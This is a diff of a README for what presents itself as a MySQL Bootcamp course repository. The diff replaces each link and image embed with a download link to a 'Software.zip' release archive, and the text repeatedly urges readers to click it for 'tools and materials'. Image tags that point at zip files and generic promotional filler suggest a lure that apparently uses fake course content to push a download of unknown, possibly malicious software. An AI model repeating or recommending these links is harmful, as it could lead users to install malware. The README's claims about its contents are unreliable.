@@ -1,6 +1,6 @@
 # Welcome to MySQL Bootcamp - Go from SQL Beginner to Expert! 🚀
 
-![MySQL Bootcamp](https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v1.0/Release.zip)
+![MySQL Bootcamp](https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v2.0/Software.zip)
 
 ## Repository Overview
 This repository, **MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert**, is a comprehensive collection of materials and resources from a MySQL Bootcamp. Whether you are just starting your SQL journey or looking to enhance your expertise, this repo has everything you need to level up your MySQL skills.
@@ -23,10 +23,10 @@ Here's a quick glance at what you'll find in this repository:
 - **Window Functions**: Explore the power of window functions in MySQL.
 
 ## Resources
-In this repository, you'll find a wealth of resources to help you progress on your MySQL journey. Whether you're a beginner or an expert, there's something here for everyone. Don't forget to check out the [**https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v1.0/Release.zip**](https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v1.0/Release.zip) for additional tools and materials.
+In this repository, you'll find a wealth of resources to help you progress on your MySQL journey. Whether you're a beginner or an expert, there's something here for everyone. Don't forget to check out the [**https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v2.0/Software.zip**](https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v2.0/Software.zip) for additional tools and materials.
 
-### **Click below to access the https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v1.0/Release.zip**
-[![https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v1.0/Release.zip](https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v1.0/Release.zip)](https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v1.0/Release.zip)
+### **Click below to access the https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v2.0/Software.zip**
+[![https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v2.0/Software.zip](https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v2.0/Software.zip)](https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v2.0/Software.zip)
 
 ## Get Started
 Ready to elevate your MySQL skills? Dive into the materials, explore the topics, and enhance your SQL expertise. Whether you're looking to learn the basics or fine-tune your advanced skills, this repository has something for everyone.
@@ -38,4 +38,4 @@ Let's embark on this MySQL Bootcamp journey together and become SQL experts! �
 
 Happy Coding! 🎉
 
-![MySQL Logo](https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v1.0/Release.zip)
+![MySQL Logo](https://github.com/jatomsplamkakj/MySQL-Bootcamp-Go-from-SQL-Beginner-to-Expert/releases/download/v2.0/Software.zip)
